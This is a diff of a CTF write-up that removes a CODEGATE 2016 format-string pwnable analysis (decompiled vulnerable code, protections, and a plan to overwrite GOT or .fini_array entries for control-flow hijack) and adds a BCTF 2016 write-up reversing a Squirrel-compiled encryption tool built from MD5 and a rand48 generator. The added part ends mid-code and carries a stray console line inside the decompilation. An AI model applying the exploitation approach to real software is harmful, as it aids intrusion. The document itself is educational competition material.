@@ -1,384 +1,726 @@
-# CODEGATE 2016: OldSchool
+# BCTF 2016: sif
 
 ## Challenge details
 | Event | Challenge | Category | Points |
 |:------|:----------|:---------|-------:|
-| CODEGATE | OldSchool | Pwnable | 490 |
+| BCTF | sif | Misc. | 350 |
 
 ### Description
-> HackerSchool FTZ Level 20
+> [sif.fd5d0eb0e7a0fdc2b0a8fad3e0015552](challenge)
 >
-> nc 175.119.158.131 17171
-> [http://codegate.bpsec.co.kr/static/files/1502184fbce57b14b4c7193cea5f2d16](challenge)
+> [flag.png.bf845d7e9972c0c05906f8d0eb831ff4](challenge)
 
-## First steps
+## Write-up
 
-The challenge consists of a target vulnerable application and two of its linked libraries with the following build info:
-
-```bash
-$ gcc -v
-Using built-in specs.
-COLLECT_GCC=gcc
-COLLECT_LTO_WRAPPER=/usr/lib/gcc/x86_64-linux-gnu/4.9/lto-wrapper
-Target: x86_64-linux-gnu
-Configured with: ../src/configure -v --with-pkgversion='Debian 4.9.2-10' --with-bugurl=file:///usr/share/doc/gcc-4.9/README.Bugs --enable-languages=c,c++,java,go,d,fortran,objc,obj-c++ --prefix=/usr --program-suffix=-4.9 --enable-shared --enable-linker-build-id --libexecdir=/usr/lib --without-included-gettext --enable-threads=posix --with-gxx-include-dir=/usr/include/c++/4.9 --libdir=/usr/lib --enable-nls --with-sysroot=/ --enable-clocale=gnu --enable-libstdcxx-debug --enable-libstdcxx-time=yes --enable-gnu-unique-object --disable-vtable-verify --enable-plugin --with-system-zlib --disable-browser-plugin --enable-java-awt=gtk --enable-gtk-cairo --with-java-home=/usr/lib/jvm/java-1.5.0-gcj-4.9-amd64/jre --enable-java-home --with-jvm-root-dir=/usr/lib/jvm/java-1.5.0-gcj-4.9-amd64 --with-jvm-jar-dir=/usr/lib/jvm-exports/java-1.5.0-gcj-4.9-amd64 --with-arch-directory=amd64 --with-ecj-jar=/usr/share/java/eclipse-ecj.jar --enable-objc-gc --enable-multiarch --with-arch-32=i586 --with-abi=m64 --with-multilib-list=m32,m64,mx32 --enable-multilib --with-tune=generic --enable-checking=release --build=x86_64-linux-gnu --host=x86_64-linux-gnu --target=x86_64-linux-gnu
-Thread model: posix
-gcc version 4.9.2 (Debian 4.9.2-10) 
-
-$ gcc -o oldschool oldschool.c -m32 -fstack-protector
-```
-
-Let's do the usual investigating:
+This challenge consisted of two files, a file named [sif](challenge/sif) and an apparently encrypted PNG file named [flag.png](challenge/flag.png). When trying to identify `sif` the usual file command was of no use:
 
 ```bash
-$ file oldschool
-oldschool; ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.6.32, not stripped
+file sif
+sif; data
 ```
+
+Taking a look with a hex editor revealed the first 6 bytes to be `"\xFA\xFARIQS"` which turned out to be the header magic for [compiled squirrel files](https://en.wikipedia.org/wiki/Squirrel_(programming_language)).
+
+```
+Offset      0  1  2  3  4  5  6  7   8  9  A  B  C  D  E  F
+
+00000000   FA FA 52 49 51 53 01 00  00 00 08 00 00 00 04 00   úúRIQS          
+00000010   00 00 54 52 41 50 10 00  00 08 07 00 00 00 00 00     TRAP          
+00000020   00 00 73 69 66 2E 6E 75  74 10 00 00 08 04 00 00     sif.nut       
+00000030   00 00 00 00 00 6D 61 69  6E 54 52 41 50                 mainTRAP
+```
+
+Squirrel is a high level imperative OO scripting language for lightweight purposes apparently used in game development. The language (and especially its compiled `cnut` format) turned out to not be all that well documented but we stumbled upon an [existing decompiler](https://github.com/darknesswind/NutCracker). The decompiler, however, failed to properly decompile `sif` with the following error:
 
 ```bash
-$ ./checksec.sh --file ./oldschool
-RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
-No RELRO        Canary found      NX enabled    No PIE          No RPATH   No RUNPATH   ./oldschool
+nutcracker.exe sif
+Error: Bad format of source binary file (PART marker was not match).
 ```
 
-Pulling it through IDA:
+So we took about reversing the `cnut` format a bit and fixing the decompiler where necessary. It turns out the `cnut` header looks roughly as follows:
+
+> [header magic (6 bytes)] [size of char (4 bytes)] [size of int (4 bytes)] [size of float (4 bytes)] [PART (in little endian)]
+
+So the 3rd to 5th data field of the header indicate the sizes it uses for elementary datatypes and we can also see every info section in `cnut` files is terminated by an expected `PART` marker to indicate we're properly parsing. When we look at the source-code of the decompiler we see the following:
+
+```cpp
+void NutFunction::Load( BinaryReader& reader )
+{
+    reader.ConfirmOnPart();
+
+    reader.ReadSQStringObject(m_SourceName);
+    reader.ReadSQStringObject(m_Name);
+
+    reader.ConfirmOnPart();
+    
+    int nLiterals = reader.ReadInt32();
+    int nParameters = reader.ReadInt32();
+    int nOuterValues = reader.ReadInt32();
+    int nLocalVarInfos = reader.ReadInt32();
+    int nLineInfos = reader.ReadInt32();
+    int nDefaultParams = reader.ReadInt32();
+    int nInstructions = reader.ReadInt32();
+    int nFunctions = reader.ReadInt32();
+```
+
+The problem here is that the ubiquitous use of `ReadInt32()` doesn't work since in our `sif` file our integer size is 8 bytes rather than 4. As such we modified the decompiler source by adding `ReadInt64()` to its definitions and modifying the decompiler to use that instead of `ReadInt32()` where necessary:
+
+```cpp
+int64_t         ReadInt64( void ){ return ReadValue<int64_t>(); }
+```
+
+After working our way through the decompiler source to address this problem we ran the fixed decompiler against `sif` and it spew out the following squirrel decompilation:
 
 ```c
-int __cdecl main(int argc, const char **argv, const char **envp)
+  // [001]  OP_NEWOBJ         3        -1   -1    2
+$[stack offset 3].A <- 0;
+$[stack offset 3].B <- 0;
+$[stack offset 3].C <- 0;
+$[stack offset 3].D <- 0;
+$[stack offset 3].buf <- null;
+$[stack offset 3].size <- 0;
+$[stack offset 3].constructor <- function ()
 {
-  int result; // eax@1
-  int v4; // edx@1
-  char user_input; // [sp+0h] [bp-40Ch]@1
-  int v6; // [sp+400h] [bp-Ch]@1
-  int *v7; // [sp+408h] [bp-4h]@1
+    this.A = 1732584193;
+    this.B = 4023233417;
+    this.C = 2562383102;
+    this.D = 271733878;
+    this.buf = this.blob();
+    this.size = 0;
+};
+$[stack offset 3]._update_block <- function ( data )
+{
+      // [000]  OP_NEWOBJ         2         0    0    1
+    local i = 0;
+      // [003]  OP_JCMP           4         9    3    3
+    i++;
+      // [012]  OP_JMP            0       -11    0    0
+    local F = function ( x, y, z )
+    {
+        return x & y | ~x & z;
+    };
+    local G = function ( x, y, z )
+    {
+        return x & z | y & ~z;
+    };
+    local H = function ( x, y, z )
+    {
+        return x ^ y ^ z;
+    };
+    local I = function ( x, y, z )
+    {
+        return (y ^ (x | ~z)) & 4294967295;
+    };
+    local Z = function ( f, a, b, c, d, x, s, t )
+    {
+        a = a + f(b, c, d) + x + t & 4294967295;
+        a = a << s & 4294967295 | (a & 4294967295) << 32 - s;
+        return a + b;
+    };
+      // [018]  OP_NEWOBJ         8        68    0    1
+    $[stack offset 8].append($[stack offset 8], $[stack offset 2].append(data.readn(105) & 4294967295));
+    $[stack offset 8].append($[stack offset 8], $[stack offset 2].append(data.readn(105) & 4294967295));
+    $[stack offset 8].append($[stack offset 8], $[stack offset 2].append(data.readn(105) & 4294967295));
+    $[stack offset 8].append($[stack offset 8], $[stack offset 2].append(data.readn(105) & 4294967295));
+    $[stack offset 8].append($[stack offset 8], $[stack offset 2].append(data.readn(105) & 4294967295));
+    $[stack offset 8].append($[stack offset 8], $[stack offset 2].append(data.readn(105) & 4294967295));
+    $[stack offset 8].append($[stack offset 8], $[stack offset 2].append(data.readn(105) & 4294967295));
+    $[stack offset 8].append($[stack offset 8], $[stack offset 2].append(data.readn(105) & 4294967295));
+    $[stack offset 8].append($[stack offset 8], $[stack offset 2].append(data.readn(105) & 4294967295));
+    $[stack offset 8].append($[stack offset 8], $[stack offset 2].append(data.readn(105) & 4294967295));
+    $[stack offset 8].append($[stack offset 8], $[stack offset 2].append(data.readn(105) & 4294967295));
+    $[stack offset 8].append($[stack offset 8], $[stack offset 2].append(data.readn(105) & 4294967295));
+    $[stack offset 8].append($[stack offset 8], $[stack offset 2].append(data.readn(105) & 4294967295));
+    $[stack offset 8].append($[stack offset 8], $[stack offset 2].append(data.readn(105) & 4294967295));
+    $[stack offset 8].append($[stack offset 8], $[stack offset 2].append(data.readn(105) & 4294967295));
+    $[stack offset 8].append($[stack offset 8], $[stack offset 2].append(data.readn(105) & 4294967295));
+    $[stack offset 8].append($[stack offset 8], $[stack offset 2].append(data.readn(105) & 4294967295));
+    $[stack offset 8].append($[stack offset 8], $[stack offset 2].append(data.readn(105) & 4294967295));
+    $[stack offset 8].append($[stack offset 8], $[stack offset 2].append(data.readn(105) & 4294967295));
+    $[stack offset 8].append($[stack offset 8], $[stack offset 2].append(data.readn(105) & 4294967295));
+    $[stack offset 8].append($[stack offset 8], $[stack offset 2].append(data.readn(105) & 4294967295));
+    $[stack offset 8].append($[stack offset 8], $[stack offset 2].append(data.readn(105) & 4294967295));
+    $[stack offset 8].append($[stack offset 8], $[stack offset 2].append(data.readn(105) & 4294967295));
+    $[stack offset 8].append($[stack offset 8], $[stack offset 2].append(data.readn(105) & 4294967295));
+    $[stack offset 8].append($[stack offset 8], $[stack offset 2].append(data.readn(105) & 4294967295));
+    $[stack offset 8].append($[stack offset 8], $[stack offset 2].append(data.readn(105) & 4294967295));
+    $[stack offset 8].append($[stack offset 8], $[stack offset 2].append(data.readn(105) & 4294967295));
+    $[stack offset 8].append($[stack offset 8], $[stack offset 2].append(data.readn(105) & 4294967295));
+    $[stack offset 8].append($[stack offset 8], $[stack offset 2].append(data.readn(105) & 4294967295));
+    $[stack offset 8].append($[stack offset 8], $[stack offset 2].append(data.readn(105) & 4294967295));
+    $[stack offset 8].append($[stack offset 8], $[stack offset 2].append(data.readn(105) & 4294967295));
+    $[stack offset 8].append($[stack offset 8], $[stack offset 2].append(data.readn(105) & 4294967295));
+    $[stack offset 8].append($[stack offset 8], $[stack offset 2].append(data.readn(105) & 4294967295));
+    $[stack offset 8].append($[stack offset 8], $[stack offset 2].append(data.readn(105) & 4294967295));
+    $[stack offset 8].append($[stack offset 8], $[stack offset 2].append(data.readn(105) & 4294967295));
+    $[stack offset 8].append($[stack offset 8], $[stack offset 2].append(data.readn(105) & 4294967295));
+    $[stack offset 8].append($[stack offset 8], $[stack offset 2].append(data.readn(105) & 4294967295));
+    $[stack offset 8].append($[stack offset 8], $[stack offset 2].append(data.readn(105) & 4294967295));
+    $[stack offset 8].append($[stack offset 8], $[stack offset 2].append(data.readn(105) & 4294967295));
+    $[stack offset 8].append($[stack offset 8], $[stack offset 2].append(data.readn(105) & 4294967295));
+    $[stack offset 8].append($[stack offset 8], $[stack offset 2].append(data.readn(105) & 4294967295));
+    $[stack offset 8].append($[stack offset 8], $[stack offset 2].append(data.readn(105) & 4294967295));
+    $[stack offset 8].append($[stack offset 8], $[stack offset 2].append(data.readn(105) & 4294967295));
+    $[stack offset 8].append($[stack offset 8], $[stack offset 2].append(data.readn(105) & 4294967295));
+    $[stack offset 8].append($[stack offset 8], $[stack offset 2].append(data.readn(105) & 4294967295));
+    $[stack offset 8].append($[stack offset 8], $[stack offset 2].append(data.readn(105) & 4294967295));
+    $[stack offset 8].append($[stack offset 8], $[stack offset 2].append(data.readn(105) & 4294967295));
+    $[stack offset 8].append($[stack offset 8], $[stack offset 2].append(data.readn(105) & 4294967295));
+    $[stack offset 8].append($[stack offset 8], $[stack offset 2].append(data.readn(105) & 4294967295));
+    $[stack offset 8].append($[stack offset 8], $[stack offset 2].append(data.readn(105) & 4294967295));
+    $[stack offset 8].append($[stack offset 8], $[stack offset 2].append(data.readn(105) & 4294967295));
+    $[stack offset 8].append($[stack offset 8], $[stack offset 2].append(data.readn(105) & 4294967295));
+    $[stack offset 8].append($[stack offset 8], $[stack offset 2].append(data.readn(105) & 4294967295));
+    $[stack offset 8].append($[stack offset 8], $[stack offset 2].append(data.readn(105) & 4294967295));
+    $[stack offset 8].append($[stack offset 8], $[stack offset 2].append(data.readn(105) & 4294967295));
+    $[stack offset 8].append($[stack offset 8], $[stack offset 2].append(data.readn(105) & 4294967295));
+    $[stack offset 8].append($[stack offset 8], $[stack offset 2].append(data.readn(105) & 4294967295));
+    $[stack offset 8].append($[stack offset 8], $[stack offset 2].append(data.readn(105) & 4294967295));
+    $[stack offset 8].append($[stack offset 8], $[stack offset 2].append(data.readn(105) & 4294967295));
+    $[stack offset 8].append($[stack offset 8], $[stack offset 2].append(data.readn(105) & 4294967295));
+    $[stack offset 8].append($[stack offset 8], $[stack offset 2].append(data.readn(105) & 4294967295));
+    $[stack offset 8].append($[stack offset 8], $[stack offset 2].append(data.readn(105) & 4294967295));
+    $[stack offset 8].append($[stack offset 8], $[stack offset 2].append(data.readn(105) & 4294967295));
+    $[stack offset 8].append($[stack offset 8], $[stack offset 2].append(data.readn(105) & 4294967295));
+    $[stack offset 8].append($[stack offset 8], $[stack offset 2].append(data.readn(105) & 4294967295));
+    $[stack offset 8].append($[stack offset 8], $[stack offset 2].append(data.readn(105) & 4294967295));
+    $[stack offset 8].append($[stack offset 8], $[stack offset 2].append(data.readn(105) & 4294967295));
+    $[stack offset 8].append($[stack offset 8], $[stack offset 2].append(data.readn(105) & 4294967295));
+    local a = this.A;
+    local b = this.B;
+    local c = this.C;
+    local d = this.D;
+    a = Z(F, a, b, c, d, $[stack offset 2][0], 7, $[stack offset 8][0]);
+    d = Z(F, d, a, b, c, $[stack offset 2][1], 12, $[stack offset 8][1]);
+    c = Z(F, c, d, a, b, $[stack offset 2][2], 17, $[stack offset 8][2]);
+    b = Z(F, b, c, d, a, $[stack offset 2][3], 22, $[stack offset 8][3]);
+    a = Z(F, a, b, c, d, $[stack offset 2][4], 7, $[stack offset 8][4]);
+    d = Z(F, d, a, b, c, $[stack offset 2][5], 12, $[stack offset 8][5]);
+    c = Z(F, c, d, a, b, $[stack offset 2][6], 17, $[stack offset 8][6]);
+    b = Z(F, b, c, d, a, $[stack offset 2][7], 22, $[stack offset 8][7]);
+    a = Z(F, a, b, c, d, $[stack offset 2][8], 7, $[stack offset 8][8]);
+    d = Z(F, d, a, b, c, $[stack offset 2][9], 12, $[stack offset 8][9]);
+    c = Z(F, c, d, a, b, $[stack offset 2][10], 17, $[stack offset 8][10]);
+    b = Z(F, b, c, d, a, $[stack offset 2][11], 22, $[stack offset 8][11]);
+    a = Z(F, a, b, c, d, $[stack offset 2][12], 7, $[stack offset 8][12]);
+    d = Z(F, d, a, b, c, $[stack offset 2][13], 12, $[stack offset 8][13]);
+    c = Z(F, c, d, a, b, $[stack offset 2][14], 17, $[stack offset 8][14]);
+    b = Z(F, b, c, d, a, $[stack offset 2][15], 22, $[stack offset 8][15]);
+    a = Z(G, a, b, c, d, $[stack offset 2][1], 5, $[stack offset 8][16]);
+    d = Z(G, d, a, b, c, $[stack offset 2][6], 9, $[stack offset 8][17]);
+    c = Z(G, c, d, a, b, $[stack offset 2][11], 14, $[stack offset 8][18]);
+    b = Z(G, b, c, d, a, $[stack offset 2][0], 20, $[stack offset 8][19]);
+    a = Z(G, a, b, c, d, $[stack offset 2][5], 5, $[stack offset 8][20]);
+    d = Z(G, d, a, b, c, $[stack offset 2][10], 9, $[stack offset 8][21]);
+    c = Z(G, c, d, a, b, $[stack offset 2][15], 14, $[stack offset 8][22]);
+    b = Z(G, b, c, d, a, $[stack offset 2][4], 20, $[stack offset 8][23]);
+    a = Z(G, a, b, c, d, $[stack offset 2][9], 5, $[stack offset 8][24]);
+    d = Z(G, d, a, b, c, $[stack offset 2][14], 9, $[stack offset 8][25]);
+    c = Z(G, c, d, a, b, $[stack offset 2][3], 14, $[stack offset 8][26]);
+    b = Z(G, b, c, d, a, $[stack offset 2][8], 20, $[stack offset 8][27]);
+    a = Z(G, a, b, c, d, $[stack offset 2][13], 5, $[stack offset 8][28]);
+    d = Z(G, d, a, b, c, $[stack offset 2][2], 9, $[stack offset 8][29]);
+    c = Z(G, c, d, a, b, $[stack offset 2][7], 14, $[stack offset 8][30]);
+    b = Z(G, b, c, d, a, $[stack offset 2][12], 20, $[stack offset 8][31]);
+    a = Z(H, a, b, c, d, $[stack offset 2][5], 4, $[stack offset 8][32]);
+    d = Z(H, d, a, b, c, $[stack offset 2][8], 11, $[stack offset 8][33]);
+    c = Z(H, c, d, a, b, $[stack offset 2][11], 16, $[stack offset 8][34]);
+    b = Z(H, b, c, d, a, $[stack offset 2][14], 23, $[stack offset 8][35]);
+    a = Z(H, a, b, c, d, $[stack offset 2][1], 4, $[stack offset 8][36]);
+    d = Z(H, d, a, b, c, $[stack offset 2][4], 11, $[stack offset 8][37]);
+    c = Z(H, c, d, a, b, $[stack offset 2][7], 16, $[stack offset 8][38]);
+    b = Z(H, b, c, d, a, $[stack offset 2][10], 23, $[stack offset 8][39]);
+    a = Z(H, a, b, c, d, $[stack offset 2][13], 4, $[stack offset 8][40]);
+    d = Z(H, d, a, b, c, $[stack offset 2][0], 11, $[stack offset 8][41]);
+    c = Z(H, c, d, a, b, $[stack offset 2][3], 16, $[stack offset 8][42]);
+    b = Z(H, b, c, d, a, $[stack offset 2][6], 23, $[stack offset 8][43]);
+    a = Z(H, a, b, c, d, $[stack offset 2][9], 4, $[stack offset 8][44]);
+    d = Z(H, d, a, b, c, $[stack offset 2][12], 11, $[stack offset 8][45]);
+    c = Z(H, c, d, a, b, $[stack offset 2][15], 16, $[stack offset 8][46]);
+    b = Z(H, b, c, d, a, $[stack offset 2][2], 23, $[stack offset 8][47]);
+    a = Z(I, a, b, c, d, $[stack offset 2][0], 6, $[stack offset 8][48]);
+    d = Z(I, d, a, b, c, $[stack offset 2][7], 10, $[stack offset 8][49]);
+    c = Z(I, c, d, a, b, $[stack offset 2][14], 15, $[stack offset 8][50]);
+    b = Z(I, b, c, d, a, $[stack offset 2][5], 21, $[stack offset 8][51]);
+    a = Z(I, a, b, c, d, $[stack offset 2][12], 6, $[stack offset 8][52]);
+    d = Z(I, d, a, b, c, $[stack offset 2][3], 10, $[stack offset 8][53]);
+    c = Z(I, c, d, a, b, $[stack offset 2][10], 15, $[stack offset 8][54]);
+    b = Z(I, b, c, d, a, $[stack offset 2][1], 21, $[stack offset 8][55]);
+    a = Z(I, a, b, c, d, $[stack offset 2][8], 6, $[stack offset 8][56]);
+    d = Z(I, d, a, b, c, $[stack offset 2][15], 10, $[stack offset 8][57]);
+    c = Z(I, c, d, a, b, $[stack offset 2][6], 15, $[stack offset 8][58]);
+    b = Z(I, b, c, d, a, $[stack offset 2][13], 21, $[stack offset 8][59]);
+    a = Z(I, a, b, c, d, $[stack offset 2][4], 6, $[stack offset 8][60]);
+    d = Z(I, d, a, b, c, $[stack offset 2][11], 10, $[stack offset 8][61]);
+    c = Z(I, c, d, a, b, $[stack offset 2][2], 15, $[stack offset 8][62]);
+    b = Z(I, b, c, d, a, $[stack offset 2][9], 21, $[stack offset 8][63]);
+    this.A = this.A + a & 4294967295;
+    this.B = this.B + b & 4294967295;
+    this.C = this.C + c & 4294967295;
+    this.D = this.D + d & 4294967295;
+};
+$[stack offset 3].update <- function ( data )
+{
+    while (!data.eos())
+    {
+        this.buf.seek(0, 101);
+        this.buf.writeblob(data.readblob(64 - this.buf.len()));
 
-  v7 = &argc;
-  v6 = *MK_FP(__GS__, 20);
-  memset(&user_input, 0, 0x400u);
-  printf("YOUR INPUT :");
-  fgets(&user_input, 1020, _bss_start);
-  printf("RESPONSE :");
-  printf(&user_input);
-  result = 0;
-  v4 = *MK_FP(__GS__, 20) ^ v6;
-  return result;
-}
+        if (this.buf.len() == 64)
+        {
+            this.buf.seek(0);
+            this._update_block(this.buf);
+            this.buf.resize(0);
+        }
+    }
+
+    this.size += data.len();
+};
+$[stack offset 3].final <- function ()
+{
+    this.buf.seek(0, 101);
+    this.buf.writen(128, 98);
+    64 - this.buf.len();
+      // [016]  OP_JCMP           2        22    1    3
+    this.buf.len();
+      // [021]  OP_JCMP           2         6    1    3
+    this.buf.writen(0, 98);
+      // [027]  OP_JMP            0       -11    0    0
+    this.buf.seek(0);
+    this._update_block(this.buf);
+    this.buf.resize(0);
+    this.buf.len();
+    64 - 8;
+      // [045]  OP_JCMP           2         6    1    3
+    this.buf.writen(0, 98);
+      // [051]  OP_JMP            0       -13    0    0
+    this.buf.writen(this.size * 8, 108);
+    this.buf.seek(0);
+    this._update_block(this.buf);
+    this.buf.resize(0);
+    local result = this.blob();
+    result.writen(this.A, 105);
+    result.writen(this.B, 105);
+    result.writen(this.C, 105);
+    result.writen(this.D, 105);
+    result.seek(0);
+    return result;
+};
+this.MaryTheFifthDumplingsCook <- $[stack offset 3];
+local str2blob = function ( str )
+{
+    local result = this.blob();
+
+    foreach( x in str )
+    {
+        result.writen(x, 98);
+    }
+
+    result.seek(0);
+    return result;
+};
+  // [035]  OP_NEWOBJ         4        -1   -1    2
+$[stack offset 4].salt <- "";
+$[stack offset 4].fn <- "";
+$[stack offset 4].fileobj <- null;
+$[stack offset 4].mana <- null;
+  // [047]  OP_NEWOBJ         6         2    0    1
+$[stack offset 6].append($[stack offset 6], $[stack offset 8]);
+$[stack offset 6].append($[stack offset 6], $[stack offset 8]);
+$[stack offset 4].cur <- $[stack offset 6];
+$[stack offset 4].pos <- 0;
+$[stack offset 4].header <- null;
+$[stack offset 4].buffer <- this.blob(0);
+$[stack offset 4].constructor <- function ( salt, fn, fileobj )
+{
+    this.salt = salt;
+    this.fileobj = fileobj;
+    local i = fn.len() - 1;
+
+    while (i && fn[i] != 47 && fn[i] != 92)
+    {
+        i--;
+    }
+
+    this.fn = fn.slice(i);
+    this.seek(0);
+};
+$[stack offset 4].seek <- function ( offset, origin = 98 ) : ( str2blob )
+{
+    if (origin != 98 || offset != 0)
+    {
+        throw "not implemented";
+    }
+
+    local engine = this.MaryTheFifthDumplingsCook();
+      // [012]  OP_GETOUTER       6         0    0    0
+    engine.update($[stack offset 6](this.salt + this.fn));
+    local digest = engine.final();
+    this.header = digest.readblob(8);
+    this.mana = this.magic(digest.readn(108) & 4294967295);
+    this.pos = 0;
+    this.fileobj.seek(offset);
+};
+$[stack offset 4].eos <- function ()
+{
+    return this.header.eos() && this.fileobj.eos();
+};
+$[stack offset 4].magic <- function ( x )
+{
+    // Function is a generator.
+    while (true)
+    {
+        yield x;
+        x = x * 3740067437 + 11;
+        x = x & (1 << 48) - 1;
+    }
+};
+$[stack offset 4].readblob <- function ( size )
+{
+    local result = this.blob(0);
+
+    if (size && !this.header.eos())
+    {
+        local t = this.header.readblob(size);
+        size = size - t.len();
+        result.writeblob(t);
+    }
+
+    if (size && !this.fileobj.eos())
+    {
+        local i = 0;
+          // [030]  OP_JCMP           1        46    3    3
+
+        if (this.fileobj.eos())
+        {
+        }
+        else
+        {
+            if (this.pos == 0)
+            {
+                local rk = resume this.mana;
+                  // [043]  OP_NEWOBJ         6         4    0    1
+                $[stack offset 6].append($[stack offset 6], rk << 40);
+                $[stack offset 6].append($[stack offset 6], rk << 32);
+                $[stack offset 6].append($[stack offset 6], rk << 24);
+                $[stack offset 6].append($[stack offset 6], rk << 16Press any key to continue . . . 
+);
+                this.cur = $[stack offset 6];
+            }
+
+            result.writen(this.fileobj.readn(98) ^ this.cur[this.pos], 98);
+            this.pos = this.pos + 1 & 3;
+            i++;
+              // [076]  OP_JMP            0       -47    0    0
+        }
+    }
+
+    return result;
+};
+this.ClabEncryptionStream <- $[stack offset 4];
+local print_banner = function ()
+{
+    this.print(" \r\n ,;;:;,                       \r\n   ;;;;;                \r\n  ,:;;:;    ,\'=.          Squirrel Idol Festival\r\n  ;:;:;\' .=\" ,\'_\\     - an encrypt-only file vault\r\n  \':;:;,/  ,__:=@        \r\n   \';;:;  =./)_        We love nuts and your filez!\r\n     `\"=\\_  )_\"`        \r\n          ``\'\"`\r\n");
+};
+local main = function ( args ) : ( print_banner )
+{
+      // [000]  OP_GETOUTER       2         0    0    0
+    $[stack offset 2]();
+    local key = "BCTF{Apparently this is a fake flag}";
+
+    if (args.len() == 2)
+    {
+        key = args[1];
+    }
+    else if (args.len() != 1)
+    {
+        this.print("Usage: sif <file> [key]\n");
+        return;
+    }
+
+    this.srand(this.time());
+    local enc = this.ClabEncryptionStream(key, args[0], this.file(args[0], "rb"));
+    local tmpfile = "tmp-" + this.rand().tostring();
+    local out = this.file(tmpfile, "wb");
+
+    while (!enc.eos())
+    {
+        out.writeblob(enc.readblob(4096));
+    }
+
+    out.close();
+    this.remove(args[0]);
+    this.rename(tmpfile, args[0]);
+    this.print("Done! Now cracking your file is as hard as cracking nuts :)\n");
+};
+main(vargv);
 ```
 
-As we can see there's trivial format string vulnerability here but the complexity of this challenge doesn't lie in the vulnerability finding so much as its (reliable) exploitation. Given that we have a fms vulnerability we have a so-called 'write-anything-anywhere' primitive which allows us to write any DWORD value to any address.
+Taking a look at the `main` function we see the following is done:
 
-So we need to find a suitable target address for overwriting which will allow us to hijack EIP control. Since we don't have a reliable infoleak (we can't use our FMS vuln (yet) for this since we cannot incorporate its results into our fms exploit string) and we assume ASLR is enabled we will need a static address that gets dereferenced somewhere and whose contents influence control-flow. A classical target for this (since RELRO is not enabled for this binary) are the entries in the GOT table but if we look at our target's disassembly we can see the following:
+```c
+    local enc = this.ClabEncryptionStream(key, args[0], this.file(args[0], "rb"));
+    local tmpfile = "tmp-" + this.rand().tostring();
+    local out = this.file(tmpfile, "wb");
 
-```asm
-.text:080484F9                 add     esp, 10h
-.text:080484FC                 sub     esp, 0Ch
-.text:080484FF                 push    offset aResponse ; "RESPONSE :"
-.text:08048504                 call    _printf
-.text:08048509                 add     esp, 10h
-.text:0804850C                 sub     esp, 0Ch
-.text:0804850F                 lea     eax, [ebp+s]
-.text:08048515                 push    eax             ; format
-.text:08048516                 call    _printf
-.text:0804851B                 add     esp, 10h
-.text:0804851E                 mov     eax, 0
-.text:08048523                 mov     edx, [ebp+var_C]
-.text:08048526                 xor     edx, large gs:14h
-.text:0804852D                 jz      short loc_8048534
-.text:0804852F                 call    ___stack_chk_fail
-.text:08048534 ; ---------------------------------------------------------------------------
-.text:08048534
-.text:08048534 loc_8048534:                            ; CODE XREF: main+92j
-.text:08048534                 lea     esp, [ebp-8]
-.text:08048537                 pop     ecx
-.text:08048538                 pop     edi
-.text:08048539                 pop     ebp
-.text:0804853A                 lea     esp, [ecx-4]
-.text:0804853D                 retn
-.text:0804853D main            endp
+    while (!enc.eos())
+    {
+        out.writeblob(enc.readblob(4096));
+    }
+
+    out.close();
 ```
 
-The only externally linked function that gets called after our fms is executed is the stack-cookie validation routine `___stack_chk_fail` and this routine only gets executed if we corrupt the saved stack cookie on the stack. Unfortunately we cannot do this as we don't know its address on the stack and as such cannot trigger `___stack_chk_fail` and have no suitable target for our GOT overwrite.
+So a user-supplied key is taken and fed together with the target file to an encryption object which writes the ciphertext to a new file. Taking a look at `ClabEncryptionStream` (which resides at `this.ClabEncryptionStream <- $[stack offset 4];`) shows its constructor to do the following:
 
-Luckily for us we have a writable `.fini_array` section:
+```c
+$[stack offset 4].constructor <- function ( salt, fn, fileobj )
+{
+    this.salt = salt;
+    this.fileobj = fileobj;
+    local i = fn.len() - 1;
+
+    while (i && fn[i] != 47 && fn[i] != 92)
+    {
+        i--;
+    }
+
+    this.fn = fn.slice(i);
+    this.seek(0);
+};
+```
+
+So we assign our key to `this.salt` and take discard the path from the target filename and assign the result to `this.fn` after which we call `seek` which looks as follows:
+
+```c
+$[stack offset 4].seek <- function ( offset, origin = 98 ) : ( str2blob )
+{
+    if (origin != 98 || offset != 0)
+    {
+        throw "not implemented";
+    }
+
+    local engine = this.MaryTheFifthDumplingsCook();
+      // [012]  OP_GETOUTER       6         0    0    0
+    engine.update($[stack offset 6](this.salt + this.fn));
+    local digest = engine.final();
+    this.header = digest.readblob(8);
+    this.mana = this.magic(digest.readn(108) & 4294967295);
+    this.pos = 0;
+    this.fileobj.seek(offset);
+};
+```
+
+Here `engine` is constructed using the `MaryTheFifthDumplingsCook` object and we feed the concatenation `this.salt + this.fn` to it before taking its digest. The use of the terms `digest` and `salt` already reveal its probably a hash function and a quick look at the constructor reveals it is MD5 (which we can tell from the IV values in A,B,C and D and the structure of the `update` function):
+
+```c
+$[stack offset 3].constructor <- function ()
+{
+    this.A = 1732584193;
+    this.B = 4023233417;
+    this.C = 2562383102;
+    this.D = 271733878;
+    this.buf = this.blob();
+    this.size = 0;
+};
+```
+
+So from this `md5(key + filename)` digest we take 8 bytes and assign them to `header` and use the next 8 bytes as a value which is bitmasked and fet into `this.magic`. Note that here the decompiler screwed up and reports the bitmask to be `4294967295 = 0xFFFFFFFF` but it should be larger. It was, however, probably truncated by the decompiler using a 32-bit variable internally which we hadn't updated to a 64-bit one yet, a phenomenon which proved to be quite a pain throughout this reversing process. Either way taking a look at `magic` reveals it is a [linear congruential generator](https://en.wikipedia.org/wiki/Linear_congruential_generator):
+
+```c
+$[stack offset 4].magic <- function ( x )
+{
+    // Function is a generator.
+    while (true)
+    {
+        yield x;
+        x = x * 3740067437 + 11;
+        x = x & (1 << 48) - 1;
+    }
+};
+```
+
+Here, again, the multiplier `3740067437 = 0xDEECE66D` turned out to be a 32-bit truncation of the actual multiplier `0x5DEECE66D` which of course makes this the POSIX rand48 LCG with `multiplier = 0x5DEECE66D`, `addend = 0xB` and `modulus = 2**48`. Of interest here is that the function is a generator (which in squirrel is called when prefixed with `resume`) and it starts with a `yield` statement meaning the first value it will return is its seed, which is of help later on.
+
+Now we can take a look at the `readblob` function which does the actual encryption:
+
+```c
+$[stack offset 4].readblob <- function ( size )
+{
+    local result = this.blob(0);
+
+    if (size && !this.header.eos())
+    {
+        local t = this.header.readblob(size);
+        size = size - t.len();
+        result.writeblob(t);
+    }
+
+    if (size && !this.fileobj.eos())
+    {
+        local i = 0;
+          // [030]  OP_JCMP           1        46    3    3
+
